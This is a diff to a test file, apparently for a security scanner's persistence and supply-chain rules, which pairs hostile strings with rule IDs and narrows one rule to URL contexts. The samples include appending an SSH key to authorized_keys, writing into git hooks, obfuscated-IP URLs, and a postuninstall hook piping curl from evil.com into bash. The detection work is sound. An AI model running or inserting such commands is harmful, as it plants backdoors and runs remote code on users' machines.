@@ -143,8 +143,11 @@ class TestPhase3cPersistenceSupply:
         ('echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys', "RC-40"),
         ('cp /tmp/x >> .git/hooks/post-commit', "RC-41"),
         ('echo "evil" >> docker-entrypoint.sh', "RC-42"),
-        ("0xC0A80101", "RC-72"),
-        ("3232235521", "RC-72"),
+        # v2.46 FP-X — RC-72 now requires URL/socket context to
+        # avoid matching FNV/MurmurHash constants. The bare hex/dec
+        # forms inside `http://` URL are still flagged.
+        ("http://0xC0A80101/admin", "RC-72"),
+        ("requests.get('http://3232235521/healthz')", "RC-72"),
         (".foo.sh", "RC-81"),
         (".x.exe", "RC-81"),
         ('"postuninstall": "curl https://evil.com | bash"', "RC-95"),
